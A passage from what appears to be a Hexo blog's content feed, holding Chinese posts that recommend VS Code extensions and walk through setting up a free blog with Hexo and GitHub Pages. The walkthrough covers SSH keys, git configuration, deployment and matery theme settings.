rel="noopener">Babelrc</a>: 验证<code>babelrc</code>内的语法格式!!</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Doleg-shilo.codemap" target="_blank" rel="noopener">CodeMap</a>: 可以理解为”大纲”,支持<code>ts</code>,<code>md</code>,<code>python</code>. 挺实用的</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmsjsdiag.debugger-for-chrome" target="_blank" rel="noopener">Debugger for Chrome</a>: 更新迭代了那么久,稳定性已经很不错了,非常棒的调试工具.用过都说好</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DHookyQR.JSDocTagComplete" target="_blank" rel="noopener">Complete JSDoc Tags</a>: 智能提示补全<code>JSDOC</code>的语法</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dfelipecaputo.git-project-manager" target="_blank" rel="noopener">Git Project Manager</a>: 适合有多个<code>git</code>项目的小伙伴,可以快速跳转,比如打开文件夹慢慢找快 N 倍</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dteledemic.branch-warnings" target="_blank" rel="noopener">Git Branch Warnings</a>: 一个很温馨的提醒,可以高亮某个分支提醒你要慎重,这个小功能感觉以后会内置</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Deamodio.gitlens" target="_blank" rel="noopener">Git Lens</a>: 暂时没有发现比这个看git记录更为详细了,内置功能很多..很方便</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dwmaurer.vscode-jumpy" target="_blank" rel="noopener">jumpy</a>: 羡慕<code>vim</code>党,但是不会耍,想快速跳转到指定位置!这个就可以…</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dymotongpoo.licenser" target="_blank" rel="noopener">licenser</a>: 可以快速生成开源协议的<strong>头部</strong>!!,配置自己的用户名和邮箱等,挺实用的</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dalefragnani.Bookmarks" target="_blank" rel="noopener">Bookmarks</a>: 给文件某个位置打标签,用来快速跳转的..不知道这个功能到现在为何没内置!!</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dle0zh.vscode-regexp-preivew" target="_blank" rel="noopener">RegExp Preview and Editor</a>: 这个就厉害了.可以完美的展示你写的正则,图形化给你看你写正则的形成</p></li></ul><h3 id="文章撰写"><a href="#文章撰写" class="headerlink" title="文章撰写"></a>文章撰写</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DSpades.vs-picgo" target="_blank" rel="noopener">PicGo</a> : 很实用的图床上传工具,直接返回<code>url</code>,用了都说好.</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DTomasHubelbauer.vscode-markdown-link-suggestions" target="_blank" rel="noopener">MarkDown Link Suggestions</a> : <code>md</code>内本地资源智能提示</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Datalent.markdown-command-assist" target="_blank" rel="noopener">Markdown Command Assist</a>:傻瓜化<code>md</code>使用,鼠标右键选择生成</li></ul><h3 id="Markdown-md-规范的文档"><a href="#Markdown-md-规范的文档" class="headerlink" title="Markdown(md 规范的文档)"></a>Markdown(md 规范的文档)</h3><blockquote><p>为什么单独抽出来,有好几个实用的插件…打造好完全不输所谓的纯 MD 编辑器好么!!!</p></blockquote><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dshd101wyy.markdown-preview-enhanced" target="_blank" rel="noopener">Markdown Preview Enhanced</a>: 国人出品的精品插件!!!涵盖的东西很多,上至公式下至导出(装了这个其他都是可以选装了),不过你要跟着它提供的文档把对应的功能点依赖给补齐了..适合愿意折腾的</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dyzhang.markdown-all-in-one" target="_blank" rel="noopener">Markdown All in One</a>: 添加了一些内置md 没有的,比如支持 github的 <code>tasklist</code>,<code>table formatter</code>,还有 <code>TOC</code>和快捷键这些</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dgoessner.mdmath" target="_blank" rel="noopener">Markdown+Math</a>: 支持多种数学公式的展示!!</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dyzane.markdown-pdf" target="_blank" rel="noopener">Markdown PDF</a>: 把 MD 转为 PDF,支持<code>emoji</code>,<code>checkbox</code>和语法高亮</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dbierner.markdown-mermaid" target="_blank" rel="noopener">Markdown Preview Mermaid Support</a>:支持<code>Mermaid</code>规范的流程表生成</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dbierner.markdown-emoji" target="_blank" rel="noopener">Markdown Emoji</a>: 支持 md 插入<code>emoji</code>..但是用起来支持的力度不怎么够,不知道作者会不会继续维护下去..但是常见的<code>emoji</code>是有的</li></ul><h3 id="css-or-scss"><a href="#css-or-scss" class="headerlink" title="css or scss"></a>css or scss</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dkisstkondoros.csstriggers" target="_blank" rel="noopener">css-triggers</a>:这个插件的亮点就是可以看到渲染的流程和理论…可以当做参考工具</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DP-de-Jong.vscode-html-scss" target="_blank" rel="noopener">HTML SCSS Support</a>: scss的智能补全,支持在 <code>html</code>,<code>ng</code>,<code>vue</code>,<code>.net</code>等使用(布局局限具体看文档).</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmrmlnc.vscode-autoprefixer" target="_blank" rel="noopener">Autoprefixer</a>: 若是基于脚手架的项目基本配置下就好了(不用这个插件)..这个一般用于你想写点什么或者维护老项目,可以省点时间的</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dohansemmanuel.css-grid-snippets" target="_blank" rel="noopener">CSS Grid Snippets</a>: <code>CSS Grid</code>的代码片段,<code>CSS Grid</code>是下一代的布局姿势,不过目前兼容性很渣..成为主流可能要等个三四年,移动端上好一些(但只限于比较新的系统)</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmrmlnc.vscode-scss" target="_blank" rel="noopener">SCSS IntelliSense</a>: scss的智能提示</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dvunguyentuan.vscode-css-blocks" target="_blank" rel="noopener">CSS Blocks</a>: 支持css模块化的智能提示,跳转</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dwangtao0101.vscode-perfect-css-modules" target="_blank" rel="noopener">perfect-css-modules</a>: <code>css modules</code>,作用类似同上</li></ul><h3 id="语法校验"><a href="#语法校验" class="headerlink" title="语法校验"></a>语法校验</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dshinnn.stylelint" target="_blank" rel="noopener">stylelint</a>: 比内置的要全，更智能</li></ul><h3 id="代码片段插件"><a href="#代码片段插件" class="headerlink" title="代码片段插件"></a>代码片段插件</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dxabikos.JavaScriptSnippets" target="_blank" rel="noopener">JavaScript (ES6) code snippets </a>: ES6的代码片段，实用</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dakamud.vscode-javascript-snippet-pack" target="_blank" rel="noopener">JavaScript Snippet Pack </a>: ES5及以下的代码片段，实用</li></ul>]]></content>
      
      
      <categories>
          
          <category> vscode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+github搭建免费个人网站</title>
      <link href="2019/09/09/theme/"/>
      <url>2019/09/09/theme/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GitHub page提供了免费的服务搭建</p><ol><li>免费域名 xxx.github.io  xxx是你的GitHub用户名</li><li>免费的代码存储空间</li><li>全是静态文件，快速访问</li><li>git版本管理，能快速回滚或者切换的某个版本</li></ol><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h3><p>（如果已拥有GitHub账号 无需重新注册）  </p><p>点击sign in 页面的Create an account</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo1.png" alt></p><p>注册页面信息填写：  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo2.png" alt></p><p>注册完成之后直接登录</p><h3 id="node环境"><a href="#node环境" class="headerlink" title="node环境"></a>node环境</h3><p>本地安装nodejs环境，此处就不在详细介绍安装了。</p><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p>为了把本地的网页文件上传到github上面去，我们需要用到分布式版本控制工具————Git<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">[下载地址]</a>。</p><p>安装选项还是全部默认，只不过最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>，这样我们就可以直接在命令提示符里打开git了。</p><p>安装完成后在命令提示符中输入<code>git --version</code>验证是否安装成功。</p><p>window需要安装git bash或者其他工具来支持git命令的使用</p><h2 id="GitHub博客注册"><a href="#GitHub博客注册" class="headerlink" title="GitHub博客注册"></a>GitHub博客注册</h2><p>接下来就是去GitHub上注册一个git page来存放我们的博客静态页面</p><p>点击新增项目  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo3.png" alt></p><p>打开新增页面  </p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo4.png" alt></p><p>填写新增信息。  </p><p><code>填写注意事项:</code>  </p><ol><li>name填写XXX.github.io </li><li>上面的XXX就是你的GitHub用户名owner</li><li>一定要填写.github.io后缀 不然就创建成普通项目了</li></ol><p>创建完成会自动生成<a href="https://gongchenghuigch.github.io/">https://gongchenghuigch.github.io/</a> 这样的访问地址</p><p>Repository那么一定要按规则填写 不然后期会出现博客代码提交不上去的问题</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo5.png" alt></p><p>如果你的这个page地址已占用看是否能把它迁移到别的page下面</p><h2 id="配置SSH-key"><a href="#配置SSH-key" class="headerlink" title="配置SSH key"></a>配置SSH key</h2><p>在本地代码push是需要你的GitHub权限，但是直接使用用户名和密码太不安全了，所以我们使用ssh key来解决本地和服务器的连接问题。</p><h3 id="本地公钥生成"><a href="#本地公钥生成" class="headerlink" title="本地公钥生成"></a>本地公钥生成</h3><pre class="line-numbers language-js"><code class="language-js">ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa <span class="token operator">-</span>C <span class="token string">"邮箱地址"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo6.png" alt></p><p>如果本地目录下面已存在 直接覆盖原有的就可以</p><h3 id="GitHub配置"><a href="#GitHub配置" class="headerlink" title="GitHub配置"></a>GitHub配置</h3><p>setting&gt;SSH and GPG keys&gt;New SSH key</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo8.png" alt></p><p>copy本地刚刚生成的.ssh/id_rsa.pub里面的全部内容</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo7.png" alt></p><p>每个人生成的目录地址可能是不一样的，可以在ssh生成的时候看到你本地的生成地址</p><h3 id="检测是否添加成功"><a href="#检测是否添加成功" class="headerlink" title="检测是否添加成功"></a>检测是否添加成功</h3><pre><code>ssh -T git@github.com # 注意邮箱地址不用改</code></pre><p>如果提示<code>Are you sure you want to continue connecting (yes/no)?</code>，输入yes，然后会看到：</p><blockquote><p>Hi gongchenghuigch! You’ve successfully authenticated, but GitHub does not provide shell access.</p></blockquote><p>看到这个信息说明SSH已配置成功</p><h3 id="git全局设置"><a href="#git全局设置" class="headerlink" title="git全局设置"></a>git全局设置</h3><pre class="line-numbers language-js"><code class="language-js">git config <span class="token operator">--</span>global user<span class="token punctuation">.</span>name <span class="token string">"xxx"</span><span class="token comment" spellcheck="true">// 你的github用户名，非昵称</span>git config <span class="token operator">--</span>global user<span class="token punctuation">.</span>email  <span class="token string">"xxx@163.com"</span><span class="token comment" spellcheck="true">// 填写你的github注册邮箱</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="使用hexo"><a href="#使用hexo" class="headerlink" title="使用hexo"></a>使用hexo</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo中文文档</a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以hexo所做的就是将这些md文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。</p><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">-</span>g hexo<span class="token operator">-</span>cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>在你电脑找一个文件目录下执行</p><pre class="line-numbers language-js"><code class="language-js">$ hexo init <span class="token operator">&lt;</span>folder<span class="token operator">></span>$ cd <span class="token operator">&lt;</span>folder<span class="token operator">></span>$ npm install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行完成会出现以下的目录结构：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">.</span>├── _config<span class="token punctuation">.</span>yml├── <span class="token keyword">package</span><span class="token punctuation">.</span>json├── scaffolds├── source<span class="token operator">|</span>   ├── _drafts<span class="token operator">|</span>   └── _posts└── themes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>_config.yml网站的 <a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">配置</a> 信息，您可以在此配置大部分的参数。</p><h3 id="本地启动"><a href="#本地启动" class="headerlink" title="本地启动"></a>本地启动</h3><pre><code>hexo server 或者 hexo s</code></pre><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo9.png" alt></p><p>浏览器窗口访问<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 会出现以下页面：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo11.png" alt></p><p> 这个是默认主题 比较丑陋；下面会介绍一些个人比较喜欢的主题。</p><h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>配置<code>_config.yml</code>中有关deploy的部分：</p><pre class="line-numbers language-js"><code class="language-js">deploy<span class="token punctuation">:</span>  type<span class="token punctuation">:</span> git  repository<span class="token punctuation">:</span> git@github<span class="token punctuation">.</span>com<span class="token punctuation">:</span>gongchenghuigch<span class="token operator">/</span>gongchenghuigch<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>git  branch<span class="token punctuation">:</span> master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>注意：</code></p><p>repository不要写成git clone的https的地址  </p><p>错误写法：</p><pre><code>deploy:  type: git  repository: https://github.com/gongchenghuigch/gongchenghuigch.github.io.git  branch: master</code></pre><p>配置完之后直接执行命令：</p><pre><code>hexo d</code></pre><p>执行完命名之后会在本地生成public打包的静态文件和.deploy_git提交git的编译之后的静态文件</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo12.png" alt></p><p>public和.deploy_git下编译的静态文件如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo13.png" alt></p><p>如果在开发过程中想看的编译的静态文件直接执行命令：</p><pre><code>hexo generate</code></pre><p><code>注意：</code></p><p>在发布时如果本地已存在public需要执行hexo clean或者手动删除public目录，不然不会提交最新代码</p><h3 id="新增文章"><a href="#新增文章" class="headerlink" title="新增文章"></a>新增文章</h3><pre class="line-numbers language-js"><code class="language-js">hexo <span class="token keyword">new</span> <span class="token class-name">page</span> test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>hexo会创建source/test/index.md</p><pre><code>hexo new page --path _posts/text &quot;测试页面&quot;</code></pre><p>hexo会创建source/_posts/text.md同时页面title为“测试页面”</p><h2 id="主题个性化设置"><a href="#主题个性化设置" class="headerlink" title="主题个性化设置"></a>主题个性化设置</h2><p>个人比较喜欢的主题是<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a>，下面也都是基于这个主题的一些配置</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo14.png" alt></p><h3 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h3><p>项目下面执行</p><pre><code>git clone https://github.com/blinkfox/hexo-theme-matery.git themes/matery</code></pre><p>更换根目录下的_config.yml配置文件中的theme参数</p><pre><code>## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: matery</code></pre><p>修改成你刚刚clone到本地要更换的主题</p><h3 id="文章头部设置"><a href="#文章头部设置" class="headerlink" title="文章头部设置"></a>文章头部设置</h3><p>将<code>/scaffolds/post.md</code>修改为如下代码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">--</span><span class="token operator">-</span>title<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">{</span> title <span class="token punctuation">}</span><span class="token punctuation">}</span>date<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">{</span> date <span class="token punctuation">}</span><span class="token punctuation">}</span>top<span class="token punctuation">:</span> <span class="token boolean">false</span>cover<span class="token punctuation">:</span> <span class="token boolean">false</span>password<span class="token punctuation">:</span>summary<span class="token punctuation">:</span>tags<span class="token punctuation">:</span>categories<span class="token punctuation">:</span><span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果示例：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">--</span><span class="token operator">-</span>title<span class="token punctuation">:</span> TypeScript声明文件date<span class="token punctuation">:</span> <span class="token number">2019</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">05</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">29</span>categories<span class="token punctuation">:</span> <span class="token operator">-</span> TypeScripttags<span class="token punctuation">:</span> <span class="token operator">-</span> TypeScript<span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo15.png" alt></p><h3 id="导航配置"><a href="#导航配置" class="headerlink" title="导航配置"></a>导航配置</h3><p>根目录_config.yml配置</p><pre class="line-numbers language-js"><code class="language-js">title<span class="token punctuation">:</span> gongchenghuisubtitle<span class="token punctuation">:</span> 浅夏晴空description<span class="token punctuation">:</span> 北冥有鱼，其名为鲲，鲲之大，不知其几千里也；             化而为鸟，其名为鹏<span class="token punctuation">.</span>keywords<span class="token punctuation">:</span> gongchenghui<span class="token punctuation">,</span>githubauthor<span class="token punctuation">:</span> 浅夏晴空language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CNtimezone<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主题配置themes/matery/_config.yml</p><pre class="line-numbers language-js"><code class="language-js">menu<span class="token punctuation">:</span>  主页<span class="token punctuation">:</span>    url<span class="token punctuation">:</span> <span class="token operator">/</span>    icon<span class="token punctuation">:</span> fa<span class="token operator">-</span>home  标签<span class="token punctuation">:</span>    url<span class="token punctuation">:</span> <span class="token operator">/</span>tags    icon<span class="token punctuation">:</span> fa<span class="token operator">-</span>tags  分类<span class="token punctuation">:</span>    url<span class="token punctuation">:</span> <span class="token operator">/</span>categories    icon<span class="token punctuation">:</span> fa<span class="token operator">-</span>bookmark  工具<span class="token punctuation">:</span>    url<span class="token punctuation">:</span> <span class="token operator">/</span>friends    icon<span class="token punctuation">:</span> fa<span class="token operator">-</span>rocket  归档<span class="token punctuation">:</span>    url<span class="token punctuation">:</span> <span class="token operator">/</span>archives    icon<span class="token punctuation">:</span> fa<span class="token operator">-</span>archive  关于<span class="token punctuation">:</span>    url<span class="token punctuation">:</span> <span class="token operator">/</span>about    icon<span class="token punctuation">:</span> fa<span class="token operator">-</span>user<span class="token operator">-</span>circle<span class="token operator">-</span>o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo17.png" alt></p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>页面文章标签配置：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">--</span><span class="token operator">-</span>title<span class="token punctuation">:</span> nvm版本管理date<span class="token punctuation">:</span> <span class="token number">2019</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">05</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">29</span>tags<span class="token punctuation">:</span> <span class="token operator">-</span> nodejs<span class="token operator">-</span> npm<span class="token operator">-</span> nvm<span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在每个md文件的头部添加tags标签属性， 标签下面可以写任意的标签value值；</p><p>文章里面展示效果如下（左侧）：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo18.png" alt></p><p>导航上配置完标签之后需要在本地新建标签的目录</p><pre><code>hexo new page tags</code></pre><p>切换到标签页展示如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo19.png" alt></p><p>点击每个标签都能筛选出该标签下对应的文章。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>文章分类配置：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">--</span><span class="token operator">-</span>title<span class="token punctuation">:</span> nvm版本管理date<span class="token punctuation">:</span> <span class="token number">2019</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">05</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">29</span>categories<span class="token punctuation">:</span> <span class="token operator">-</span> nodejs<span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文章内部展示效果如下（右侧）：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo18.png" alt></p><p>导航上配置完分类之后需要在本地新建分类的目录</p><pre><code>hexo new page categories</code></pre><p>切换到分类页展示如下：</p><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/docmanager/hexo20.png" alt></p><h3 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a>404页面</h3><p>原来的主题没有404页面，首先在<code>/source/</code>目录下新建一个<code>404.md</code>，内容如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">--</span><span class="token operator">-</span>title<span class="token punctuation">:</span> <span class="token number">404</span>date<span class="token punctuation">:</span> <span class="token number">2017</span><span class="token operator">-</span><span class="token number">07</span><span class="token operator">-</span><span class="token number">19</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">41</span><span class="token punctuation">:</span><span class="token number">10</span>type<span class="token punctuation">:</span> <span class="token string">"404"</span>layout<span class="token punctuation">:</span> <span class="token string">"404"</span>description<span class="token punctuation">:</span> <span class="token string">"你访问的页面被外星人叼走了 :("</span><span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在<code>/themes/matery/layout/</code>目录下新建一个<code>404.ejs</code>文件，内容如下：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token comment" spellcheck="true">/* don't remove. */</span>    <span class="token selector"><span class="token class">.about-cover</span> </span><span class="token punctuation">{</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">75</span>vh<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bg-cover pd-header about-cover<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s10 offset-s1 m8 offset-m2 l8 offset-l2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>brand<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title center-align<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        404                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description center-align<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        &lt;%= page.description %>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token comment" spellcheck="true">// 每天切换 banner 